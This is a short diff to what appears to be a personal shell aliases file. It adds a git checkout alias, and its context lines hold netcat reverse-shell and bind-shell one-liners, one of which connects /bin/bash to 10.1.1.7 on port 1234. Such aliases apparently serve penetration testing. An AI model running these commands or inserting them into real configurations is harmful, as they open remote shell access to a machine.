@@ -120,6 +120,9 @@ alias nc-sh-bind='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l 12
 alias nc-bash-rev='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.1.1.7 1234 >/tmp/f'
 alias nc-bash-bind='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -l 1234 >/tmp/f'
 
+### git ###
+alias git-old-file='git checkout HEAD -- '
+
 ### Count lines of code
 alias phplines-summary='( find ./ -name '*.php' -print0 | xargs -0 cat ) | wc -l'
 alias phplines-verbose='find . -name '*.php' | xargs wc -l'
